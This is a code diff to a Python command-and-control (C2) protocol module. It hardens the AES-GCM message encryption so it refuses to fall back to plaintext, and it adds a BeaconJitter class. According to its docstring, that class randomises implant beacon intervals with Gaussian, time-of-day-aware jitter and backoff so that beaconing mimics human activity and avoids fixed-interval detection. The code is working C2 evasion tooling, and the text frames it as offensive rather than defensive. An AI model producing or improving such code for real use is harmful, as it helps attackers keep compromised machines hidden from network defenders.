@@ -30,9 +30,11 @@ import hashlib
 import json
 import logging
 import os
+import random
 import time
 import zlib
 from dataclasses import dataclass, field, asdict
+from datetime import datetime
 from typing import Any
 
 logger = logging.getLogger(__name__)
@@ -136,9 +138,15 @@ class C2Protocol:
             aes = AESGCM(self._key)
             ciphertext = aes.encrypt(nonce, plaintext, None)
             return nonce + ciphertext
-        except ImportError:
-            # No-op passthrough when cryptography package is missing
-            return plaintext
+        except ImportError as exc:
+            logger.critical(
+                "SECURITY: 'cryptography' package is missing but an encryption "
+                "key is configured — refusing to send data in plaintext. "
+                "Install the package: pip install cryptography"
+            )
+            raise ImportError(
+                "cryptography package is required when a shared_key is configured"
+            ) from exc
 
     def _decrypt(self, data: bytes) -> bytes | None:
         """AES-256-GCM decryption."""
@@ -149,9 +157,15 @@ class C2Protocol:
             ciphertext = data[12:]
             aes = AESGCM(self._key)
             return aes.decrypt(nonce, ciphertext, None)
-        except ImportError:
-            # No-op passthrough when cryptography package is missing
-            return data
+        except ImportError as exc:
+            logger.critical(
+                "SECURITY: 'cryptography' package is missing but an encryption "
+                "key is configured — cannot decrypt data. "
+                "Install the package: pip install cryptography"
+            )
+            raise ImportError(
+                "cryptography package is required when a shared_key is configured"
+            ) from exc
 
     # ── Chunking for size-limited channels ───────────────────────────
 
@@ -164,3 +178,95 @@ class C2Protocol:
     def reassemble_chunks(chunks: list[bytes]) -> bytes:
         """Reassemble chunked data."""
         return b"".join(chunks)
+
+
+class BeaconJitter:
+    """Human-like jitter for C2 beacon intervals.
+
+    Uses Gaussian distribution to generate beacon intervals that mimic
+    human activity patterns, avoiding detection by fixed-interval analysis.
+
+    During configured "activity hours" (default 08:00–22:00 local time),
+    intervals are drawn around the base value.  Outside those hours a
+    multiplier (2–3×) is applied so beacons become less frequent —
+    matching the pattern of reduced network traffic at night.
+
+    Parameters
+    ----------
+    base_interval : float
+        Mean beacon interval in seconds (default 60).
+    stddev : float
+        Standard deviation for the Gaussian distribution (default 15).
+    min_interval : float
+        Hard lower clamp for generated intervals (default 10).
+    max_interval : float
+        Hard upper clamp for generated intervals (default 300).
+    activity_hours : tuple[int, int]
+        Inclusive start and exclusive end of the "active" window as
+        local-time hours in 24-h format (default ``(8, 22)``).
+    """
+
+    def __init__(
+        self,
+        base_interval: float = 60.0,
+        stddev: float = 15.0,
+        min_interval: float = 10.0,
+        max_interval: float = 300.0,
+        activity_hours: tuple[int, int] = (8, 22),
+    ) -> None:
+        self._base = base_interval
+        self._stddev = stddev
+        self._min = min_interval
+        self._max = max_interval
+        self._activity_start, self._activity_end = activity_hours
+
+    # ── Public API ───────────────────────────────────────────────────
+
+    def next_interval(self) -> float:
+        """Generate the next beacon interval with human-like jitter.
+
+        Returns a Gaussian-distributed value clamped to
+        ``[min_interval, max_interval]``.  Outside activity hours the
+        interval is scaled by a random factor between 2× and 3× so that
+        beacons naturally thin out during off-hours.
+        """
+        interval = random.gauss(self._base, self._stddev)
+
+        # Time-of-day awareness
+        current_hour = datetime.now().hour
+        if not self._is_active_hour(current_hour):
+            # Off-hours: multiply by 2–3× to mimic reduced activity
+            interval *= random.uniform(2.0, 3.0)
+
+        # Clamp to hard limits
+        return max(self._min, min(self._max, interval))
+
+    def next_interval_with_backoff(self, consecutive_failures: int = 0) -> float:
+        """Generate an interval with exponential backoff on failures.
+
+        Each consecutive failure doubles the interval (up to 2^5 = 32×)
+        on top of the normal jittered value.
+
+        Parameters
+        ----------
+        consecutive_failures : int
+            Number of consecutive communication failures (default 0).
+        """
+        interval = self.next_interval()
+
+        if consecutive_failures > 0:
+            backoff_factor = 2 ** min(consecutive_failures, 5)
+            interval *= backoff_factor
+
+        # Re-clamp after backoff (allow exceeding max during backoff to
+        # avoid hammering a down server, but keep a sane upper bound).
+        return max(self._min, min(interval, self._max * 32))
+
+    # ── Internals ────────────────────────────────────────────────────
+
+    def _is_active_hour(self, hour: int) -> bool:
+        """Return True if *hour* falls within the configured activity window."""
+        if self._activity_start <= self._activity_end:
+            return self._activity_start <= hour < self._activity_end
+        # Wrapped window, e.g. (22, 6) → active from 22:00 to 05:59
+        return hour >= self._activity_start or hour < self._activity_end
